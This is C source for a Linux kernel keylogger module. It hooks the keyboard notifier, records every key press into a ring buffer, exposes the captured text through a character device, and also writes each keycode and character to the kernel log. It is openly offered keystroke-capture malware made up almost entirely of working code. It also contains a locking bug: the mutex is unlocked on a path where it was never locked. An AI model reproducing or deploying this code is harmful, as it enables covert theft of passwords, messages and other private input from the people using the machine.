#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>
#include "keylogger.h"
#include "keymap.h"
#include "ringbuf.h"

#define DEVICE_NAME "keylogger"
#define CLASS_NAME "keylogger_class"


static int major_number;
static struct class *keylogger_class = NULL;
static struct device *keylogger_device = NULL;
static struct cdev keylogger_cdev;


static struct notifier_block keylogger_nb;
static struct ring_buffer *kbd_buffer;
static DEFINE_MUTEX(buffer_mutex);


static int keylogger_open(struct inode *inode, struct file *file);
static int keylogger_release(struct inode *inode, struct file *file);
static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t len, loff_t *offset);
static long keylogger_ioctl(struct file *file, unsigned int cmd, unsigned long arg);


static struct file_operations keylogger_fops = {
    .owner = THIS_MODULE,
    .open = keylogger_open,
    .release = keylogger_release,
    .read = keylogger_read,
    .unlocked_ioctl = keylogger_ioctl,
};


static int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
    char tmp[16];
    size_t len;

    printk(KERN_INFO "Keylogger: Event received - keycode: %d, down: %d, shift: %d\n", 
           param->value, param->down, param->shift);

    if (!param->down)
        return NOTIFY_OK;

    if (param->value > 0 && param->value < 59) {
        len = keycode_to_us_string(param->value, param->shift, tmp, sizeof(tmp));
        printk(KERN_INFO "Keylogger: Converted to string: '%s' (len: %zu)\n", tmp, len);

        if (len > 0) {
            mutex_lock(&buffer_mutex);
            printk(KERN_INFO "Keylogger: Writing to buffer: '%s' (len: %zu)\n", tmp, len);
            if (!ringbuf_write(kbd_buffer, tmp, len)) {
                printk(KERN_WARNING "Keylogger: Ring buffer full, data lost\n");
            }
        }
        mutex_unlock(&buffer_mutex);
    }

    return NOTIFY_OK;
}


static int keylogger_open(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "Keylogger: Device opened\n");
    return 0;
}

static int keylogger_release(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "Keylogger: Device closed\n");
    return 0;
}

static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t len, loff_t *offset)
{
    char *kernel_buffer;
    size_t bytes_read = 0;
    int ret;

    if (len == 0)
        return 0;

    kernel_buffer = kmalloc(len, GFP_KERNEL);
    if (!kernel_buffer)
        return -ENOMEM;

    mutex_lock(&buffer_mutex);
    bytes_read = ringbuf_read(kbd_buffer, kernel_buffer, len);
    mutex_unlock(&buffer_mutex);

    if (bytes_read > 0) {
        ret = copy_to_user(buffer, kernel_buffer, bytes_read);
        if (ret != 0) {
            kfree(kernel_buffer);
            return -EFAULT;
        }
    }

    kfree(kernel_buffer);
    return bytes_read;
}

static long keylogger_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    
    switch (cmd) {
        case 0: 
            mutex_lock(&buffer_mutex);
            ringbuf_clear(kbd_buffer);
            mutex_unlock(&buffer_mutex);
            return 0;
        default:
            return -ENOTTY;
    }
}

int keylogger_init(void)
{
    dev_t dev_num;
    int ret;

    printk(KERN_INFO "Keylogger: Initializing...\n");

    
    kbd_buffer = ringbuf_create(1024);
    if (!kbd_buffer) {
        printk(KERN_ERR "Keylogger: Failed to create ring buffer\n");
        return -ENOMEM;
    }

    
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "Keylogger: Failed to allocate major number\n");
        goto err_ringbuf;
    }
    major_number = MAJOR(dev_num);

    
    cdev_init(&keylogger_cdev, &keylogger_fops);
    keylogger_cdev.owner = THIS_MODULE;
    
    ret = cdev_add(&keylogger_cdev, dev_num, 1);
    if (ret < 0) {
        printk(KERN_ERR "Keylogger: Failed to add character device\n");
        goto err_chrdev;
    }

    
    keylogger_class = class_create(CLASS_NAME);
    if (IS_ERR(keylogger_class)) {
        printk(KERN_ERR "Keylogger: Failed to create device class\n");
        ret = PTR_ERR(keylogger_class);
        goto err_cdev;
    }

    
    keylogger_device = device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME);
    if (IS_ERR(keylogger_device)) {
        printk(KERN_ERR "Keylogger: Failed to create device\n");
        ret = PTR_ERR(keylogger_device);
        goto err_class;
    }

    
    keylogger_nb.notifier_call = keylogger_cb;
    ret = register_keyboard_notifier(&keylogger_nb);
    if (ret < 0) {
        printk(KERN_ERR "Keylogger: Failed to register keyboard notifier\n");
        goto err_device;
    }

    printk(KERN_INFO "Keylogger: Successfully initialized (major: %d)\n", major_number);
    return 0;

err_device:
    device_destroy(keylogger_class, dev_num);
err_class:
    class_destroy(keylogger_class);
err_cdev:
    cdev_del(&keylogger_cdev);
err_chrdev:
    unregister_chrdev_region(dev_num, 1);
err_ringbuf:
    ringbuf_free(kbd_buffer);
    return ret;
}

void keylogger_exit(void)
{
    dev_t dev_num = MKDEV(major_number, 0);

    printk(KERN_INFO "Keylogger: Exiting...\n");

    
    unregister_keyboard_notifier(&keylogger_nb);

    
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
    cdev_del(&keylogger_cdev);
    unregister_chrdev_region(dev_num, 1);

    
    ringbuf_free(kbd_buffer);

    printk(KERN_INFO "Keylogger: Successfully exited\n");
}